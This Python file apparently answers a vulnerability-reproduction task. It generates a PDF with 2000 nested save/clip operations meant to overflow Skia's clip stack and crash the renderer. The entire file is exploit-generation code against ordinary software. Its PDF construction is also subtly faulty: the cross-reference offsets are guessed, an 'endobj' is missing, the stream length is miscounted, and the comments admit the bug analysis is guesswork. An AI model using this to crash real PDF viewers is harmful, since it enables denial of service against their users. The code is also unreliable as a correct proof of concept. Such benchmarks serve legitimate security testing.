import os
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This vulnerability appears to be in Skia's clip stack handling
        # Based on the description, we need to create a deeply nested clip state
        # that exceeds the allocated buffer in the clip stack
        
        # We'll create a PDF file with excessive clip nesting
        # PDF format allows for nested graphics states with save/restore operators
        
        # Create a PDF with 1000 levels of nested clip operations
        # This should trigger the heap buffer overflow when the clip stack overflows
        
        pdf_content = self._generate_overflow_pdf()
        return pdf_content
    
    def _generate_overflow_pdf(self) -> bytes:
        # Generate a minimal PDF with deeply nested clip paths
        # Using q/Q operators for save/restore graphics state
        # and W/n operators for clip paths
        
        # Create a PDF that pushes clip marks in a deeply nested loop
        pdf_parts = []
        
        # PDF header
        pdf_parts.append(b"%PDF-1.4\n")
        pdf_parts.append(b"1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n")
        pdf_parts.append(b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n")
        pdf_parts.append(b"3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >> endobj\n")
        
        # Build the content stream with deeply nested clip operations
        content = b"stream\n"
        content += b"q\n"  # Save graphics state
        
        # Create a very deep nesting of clip operations
        # Each iteration: save state, create clip path, repeat
        for i in range(2000):  # More than enough to overflow any reasonable stack
            content += b"q\n"  # Save state (q)
            # Create a simple rectangle clip path
            x = 10 + (i % 100)
            y = 10 + (i % 100)
            content += b"%d %d 10 10 re\n" % (x, y)  # Rectangle
            content += b"W\n"  # Set clip path (W)
            content += b"n\n"  # End path without filling (n)
        
        # Close all the nested states
        for i in range(2000):
            content += b"Q\n"  # Restore state (Q)
        
        content += b"Q\n"  # Final restore
        content += b"endstream\n"
        
        pdf_parts.append(b"4 0 obj << /Length %d >>\n" % len(content))
        pdf_parts.append(content)
        
        # Cross-reference table and trailer
        xref_pos = len(b"".join(pdf_parts))
        pdf_parts.append(b"xref\n")
        pdf_parts.append(b"0 5\n")
        pdf_parts.append(b"0000000000 65535 f \n")
        pdf_parts.append(b"0000000010 00000 n \n")
        pdf_parts.append(b"0000000059 00000 n \n")
        pdf_parts.append(b"0000000120 00000 n \n")
        pdf_parts.append(b"%010d 00000 n \n" % (xref_pos - len(content) - 50))
        
        pdf_parts.append(b"trailer\n")
        pdf_parts.append(b"<< /Size 5 /Root 1 0 R >>\n")
        pdf_parts.append(b"startxref\n")
        pdf_parts.append(b"%d\n" % xref_pos)
        pdf_parts.append(b"%%EOF\n")
        
        return b"".join(pdf_parts)